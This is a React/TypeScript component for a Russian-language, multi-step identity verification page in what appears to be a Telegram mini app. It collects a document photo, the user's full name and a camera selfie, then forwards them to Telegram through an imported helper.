import React, { useState, useRef, useEffect } from 'react';
import { ArrowLeft, FileText, Camera, Check, Upload, ShieldCheck, User, Image, ChevronRight } from 'lucide-react';
import { Haptic } from '../utils/haptics';
import { useUser } from '../context/UserContext';
import { useToast } from '../context/ToastContext';
import { sendVerificationToTelegram, canSendDepositToTelegram } from '../lib/telegramNotify';

type KycStep = 'DOC_TYPE' | 'NAME' | 'DOC_PHOTO' | 'SELFIE' | 'SUCCESS';

const STEPS_ORDER: KycStep[] = ['DOC_TYPE', 'NAME', 'DOC_PHOTO', 'SELFIE', 'SUCCESS'];

const DOC_TYPES = [
  { id: 'passport', label: 'Паспорт', desc: 'Разворот с фото и данными' },
  { id: 'driver', label: 'Водительское удостоверение', desc: 'Обе стороны' },
  { id: 'id', label: 'ID-карта', desc: 'Лицевая сторона с фото' },
];

interface KycPageProps {
  onBack: () => void;
}

const KycPage: React.FC<KycPageProps> = ({ onBack }) => {
  const { user, tgid } = useUser();
  const toast = useToast();
  const [step, setStep] = useState<KycStep>('DOC_TYPE');
  const [docType, setDocType] = useState<string>('');
  const [fullName, setFullName] = useState('');
  const [docFile, setDocFile] = useState<File | null>(null);
  const [selfieFile, setSelfieFile] = useState<File | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [submittedOk, setSubmittedOk] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [cameraOn, setCameraOn] = useState(false);
  const [selfiePreviewUrl, setSelfiePreviewUrl] = useState<string | null>(null);

  useEffect(() => {
    return () => {
      streamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []);

  useEffect(() => {
    if (!selfieFile) {
      if (selfiePreviewUrl) {
        URL.revokeObjectURL(selfiePreviewUrl);
        setSelfiePreviewUrl(null);
      }
      return;
    }
    const url = URL.createObjectURL(selfieFile);
    setSelfiePreviewUrl(url);
    return () => URL.revokeObjectURL(url);
  }, [selfieFile]);

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      streamRef.current = stream;
      if (videoRef.current) videoRef.current.srcObject = stream;
      setCameraOn(true);
    } catch (e) {
      toast.show('Не удалось получить доступ к камере', 'error');
    }
  };

  const captureSelfie = () => {
    const video = videoRef.current;
    if (!video || !video.videoWidth) {
      toast.show('Включите камеру', 'error');
      return;
    }
    Haptic.medium();
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;
    ctx.drawImage(video, 0, 0);
    canvas.toBlob(
      (blob) => {
        if (!blob) return;
        const file = new File([blob], 'selfie.jpg', { type: 'image/jpeg' });
        setSelfieFile(file);
        streamRef.current?.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
        setCameraOn(false);
      },
      'image/jpeg',
      0.9
    );
  };

  const retakeSelfie = () => {
    setSelfieFile(null);
    setSelfiePreviewUrl(null);
    startCamera();
  };

  const handleSubmit = async () => {
    if (!docFile || !selfieFile) return;
    if (!canSendDepositToTelegram()) {
      toast.show('Отправка в Telegram не настроена', 'error');
      return;
    }
    setSubmitting(true);
    const docLabel = DOC_TYPES.find((d) => d.id === docType)?.label ?? docType;
    const text =
      '🛡 ЗАЯВКА НА ВЕРИФИКАЦИЮ\n\n' +
      `👤 Пользователь: ${fullName || '—'}\n` +
      `📄 Документ: ${docLabel}\n` +
      `🆔 ID: ${user?.user_id ?? tgid ?? '—'}\n` +
      `📅 ${new Date().toLocaleString('ru-RU')}\n\n` +
      '#верификация #kyc';
    const result = await sendVerificationToTelegram(text, docFile, selfieFile);
    setSubmitting(false);
    if (result.ok) {
      setSubmittedOk(true);
      setStep('SUCCESS');
      toast.show('Заявка отправлена. Ожидайте проверки.', 'success');
    } else {
      toast.show(result.error ?? 'Ошибка отправки', 'error');
    }
  };

  const stepIndex = STEPS_ORDER.indexOf(step);
  const showProgress = step !== 'SUCCESS' && stepIndex >= 0;
  const progressPercent = showProgress ? ((stepIndex + 1) / (STEPS_ORDER.length - 1)) * 100 : 0;

  return (
    <div className="flex flex-col h-full bg-[#050505] animate-fade-in">
      <header className="flex items-center px-4 py-4 border-b border-white/5 bg-[#050505] sticky top-0 z-50">
        <button onClick={() => { Haptic.tap(); onBack(); }} className="text-neutral-400 hover:text-white mr-4 active:scale-90 transition-transform">
          <ArrowLeft size={24} />
        </button>
        <span className="text-lg font-bold text-white">Верификация</span>
      </header>

      <div className="flex-1 overflow-y-auto p-4">
        {showProgress && (
          <div className="max-w-md mx-auto mb-6">
            <div className="flex justify-between text-xs text-neutral-500 mb-1.5">
              <span>Шаг {stepIndex + 1} из {STEPS_ORDER.length - 1}</span>
            </div>
            <div className="h-1.5 bg-neutral-800 rounded-full overflow-hidden">
              <div className="h-full bg-neon rounded-full transition-all duration-300" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        )}

        <div className="max-w-md mx-auto">
        {step === 'DOC_TYPE' && (
          <div className="space-y-6">
            <div className="text-center mb-6">
              <h2 className="text-xl font-bold text-white mb-1">Тип документа</h2>
              <p className="text-neutral-500 text-sm">Выберите документ, который будете загружать</p>
            </div>
            <div className="space-y-3">
              {DOC_TYPES.map((d) => (
                <button
                  key={d.id}
                  onClick={() => { Haptic.light(); setDocType(d.id); setStep('NAME'); }}
                  className="w-full bg-[#0a0a0a] border border-neutral-800 rounded-xl p-4 flex items-center gap-4 hover:border-neon/50 hover:bg-neutral-900/50 transition-all text-left group"
                >
                  <div className="w-12 h-12 rounded-xl bg-neutral-800 flex items-center justify-center flex-shrink-0 group-hover:bg-neon/20">
                    <FileText size={22} className="text-neon" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <span className="block font-semibold text-white">{d.label}</span>
                    <span className="block text-xs text-neutral-500 mt-0.5">{d.desc}</span>
                  </div>
                  <ChevronRight size={18} className="text-neutral-600 flex-shrink-0" />
                </button>
              ))}
            </div>
          </div>
        )}

        {step === 'NAME' && (
          <div className="space-y-6">
            <div className="text-center mb-2">
              <h2 className="text-xl font-bold text-white mb-1">ФИО как в документе</h2>
              <p className="text-neutral-500 text-sm">Укажите полное имя без сокращений</p>
            </div>
            <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl p-4">
              <label className="flex items-center gap-2 text-xs text-neutral-500 uppercase font-bold mb-2">
                <User size={14} />
                Фамилия, имя, отчество
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder="Иванов Иван Иванович"
                className="w-full bg-neutral-900/50 border border-neutral-800 rounded-lg px-4 py-3 text-white placeholder-neutral-600 outline-none focus:border-neon/50 transition-colors"
              />
            </div>
            <button
              onClick={() => { Haptic.light(); setStep('DOC_PHOTO'); }}
              disabled={!fullName.trim()}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] disabled:opacity-50 disabled:pointer-events-none"
            >
              Далее <ChevronRight size={18} />
            </button>
            <button onClick={() => { Haptic.light(); setStep('DOC_TYPE'); }} className="w-full text-neutral-500 text-sm py-2">
              ← Назад
            </button>
          </div>
        )}

        {step === 'DOC_PHOTO' && (
          <div className="space-y-6">
            <div className="text-center mb-2">
              <h2 className="text-xl font-bold text-white mb-1">Фото документа</h2>
              <p className="text-neutral-500 text-sm">Разворот с фото и данными. Изображение должно быть чётким</p>
            </div>
            <label className="block bg-[#0a0a0a] border-2 border-dashed border-neutral-700 rounded-2xl p-8 text-center cursor-pointer hover:border-neon/50 hover:bg-neutral-900/30 transition-all">
              <input
                type="file"
                accept="image/*"
                className="hidden"
                onChange={(e) => {
                  const f = e.target.files?.[0];
                  if (f) { Haptic.light(); setDocFile(f); setStep('SELFIE'); }
                }}
              />
              {docFile ? (
                <div className="flex flex-col items-center gap-2">
                  <div className="w-14 h-14 rounded-full bg-green-500/20 flex items-center justify-center">
                    <Check size={28} className="text-green-500" />
                  </div>
                  <span className="text-green-500 font-medium">Документ загружен</span>
                  <span className="text-neutral-500 text-xs">Нажмите, чтобы заменить</span>
                </div>
              ) : (
                <div className="flex flex-col items-center gap-3">
                  <div className="w-14 h-14 rounded-full bg-neutral-800 flex items-center justify-center">
                    <Image size={28} className="text-neutral-500" />
                  </div>
                  <span className="text-white font-medium">Загрузить фото</span>
                  <span className="text-neutral-500 text-sm">или сфотографируйте документ</span>
                </div>
              )}
            </label>
            <button onClick={() => setStep('NAME')} className="w-full text-neutral-500 text-sm py-2">
              ← Назад
            </button>
          </div>
        )}

        {step === 'SELFIE' && (
          <div className="flex flex-col items-center">
            <div className="text-center mb-6 w-full">
              <h2 className="text-xl font-bold text-white mb-1">Подтверждение личности</h2>
              <p className="text-neutral-500 text-sm">Сделайте селфи — лицо должно быть чётко видно</p>
            </div>

            {/* Превью снимка или видео с камеры */}
            <div className="relative w-full rounded-2xl overflow-hidden bg-black border border-neutral-800 aspect-[3/4] max-h-[360px] flex items-center justify-center">
              {selfieFile && selfiePreviewUrl ? (
                <img
                  src={selfiePreviewUrl}
                  alt="Селфи"
                  className="w-full h-full object-cover"
                />
              ) : (
                <video
                  ref={videoRef}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover"
                />
              )}
              {!cameraOn && !selfieFile && (
                <div className="absolute inset-0 flex flex-col items-center justify-center bg-neutral-900/90 text-neutral-500">
                  <Camera size={48} className="mb-3 opacity-60" />
                  <span className="text-sm">Камера выключена</span>
                </div>
              )}
            </div>

            {/* Кнопки по состоянию */}
            <div className="w-full mt-6 space-y-3">
              {!selfieFile && !cameraOn && (
                <button
                  type="button"
                  onClick={startCamera}
                  className="w-full py-4 bg-neon text-black font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] transition-transform"
                >
                  <Camera size={22} /> Включить камеру
                </button>
              )}
              {cameraOn && !selfieFile && (
                <button
                  type="button"
                  onClick={captureSelfie}
                  className="w-full py-4 bg-green-600 hover:bg-green-500 text-white font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] transition-transform shadow-lg shadow-green-600/20"
                >
                  <Camera size={22} /> Сделать снимок
                </button>
              )}
              {selfieFile && (
                <>
                  <p className="text-center text-green-500 text-sm mb-1">✓ Снимок готов</p>
                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={submitting}
                    className="w-full py-4 bg-neon text-black font-bold rounded-xl flex items-center justify-center gap-2 active:scale-[0.98] transition-transform disabled:opacity-50 disabled:pointer-events-none"
                  >
                    {submitting ? (
                      'Отправка…'
                    ) : (
                      <>
                        <Check size={22} /> Отправить данные на проверку
                      </>
                    )}
                  </button>
                  <button
                    type="button"
                    onClick={retakeSelfie}
                    className="w-full py-3 text-neutral-400 hover:text-white text-sm font-medium rounded-xl border border-neutral-700 hover:border-neutral-600 transition-colors"
                  >
                    Переснять селфи
                  </button>
                </>
              )}

              {!selfieFile && (
                <button
                  type="button"
                  onClick={() => {
                    streamRef.current?.getTracks().forEach((t) => t.stop());
                    streamRef.current = null;
                    setCameraOn(false);
                    setStep('DOC_PHOTO');
                  }}
                  className="w-full text-neutral-500 text-sm py-2"
                >
                  ← Назад к документу
                </button>
              )}
            </div>
          </div>
        )}

        {step === 'SUCCESS' && (
          <div className="bg-[#0a0a0a] border border-neutral-800 rounded-2xl p-8 text-center">
            <div className="w-20 h-20 rounded-full bg-green-500/20 flex items-center justify-center mx-auto mb-5">
              <ShieldCheck size={40} className="text-green-500" />
            </div>
            {submittedOk ? (
              <>
                <h2 className="text-xl font-bold text-white mb-2">Заявка отправлена</h2>
                <p className="text-neutral-500 text-sm mb-6">Данные переданы на проверку. Результат придёт в поддержку в Telegram.</p>
                <button onClick={() => { Haptic.tap(); onBack(); }} className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-[0.98]">
                  В профиль
                </button>
              </>
            ) : (
              <>
                <h2 className="text-xl font-bold text-white mb-2">Документ и селфи готовы</h2>
                <p className="text-neutral-500 text-sm mb-6">Отправьте заявку в поддержку для проверки</p>
                <button
                  onClick={handleSubmit}
                  disabled={submitting}
                  className="w-full py-4 bg-neon text-black font-bold rounded-xl disabled:opacity-50 active:scale-[0.98]"
                >
                  {submitting ? 'Отправка…' : 'Отправить заявку'}
                </button>
                <button onClick={() => { setSelfieFile(null); setStep('SELFIE'); startCamera(); }} className="mt-3 text-neutral-500 text-sm">
                  Переснять селфи
                </button>
              </>
            )}
          </div>
        )}
        </div>
      </div>
    </div>
  );
};

export default KycPage;
